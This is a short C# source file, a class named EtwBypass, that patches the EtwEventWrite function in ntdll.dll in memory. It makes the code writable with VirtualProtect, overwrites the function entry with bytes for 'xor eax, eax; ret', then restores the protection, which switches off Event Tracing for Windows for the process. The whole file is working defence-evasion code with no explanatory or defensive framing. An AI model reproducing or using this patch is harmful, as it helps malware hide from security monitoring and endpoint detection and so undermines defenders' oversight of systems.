using System;
using System.Runtime.InteropServices;

public static class EtwBypass
{
    [DllImport("kernel32")]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32")]
    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void ETWBypass()
    {
        IntPtr ntdll = GetModuleHandle("ntdll.dll");
        IntPtr etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");

        uint oldProtect;
        VirtualProtect(etwEventWrite, (UIntPtr)6, 0x40, out oldProtect);

        //again patch code  xor eax, eax; ret
        byte[] patch = new byte[] { 0x31, 0xC0, 0xC3 };

        Marshal.Copy(patch, 0, etwEventWrite, patch.Length);

        VirtualProtect(etwEventWrite, (UIntPtr)6, oldProtect, out oldProtect);
    }
}
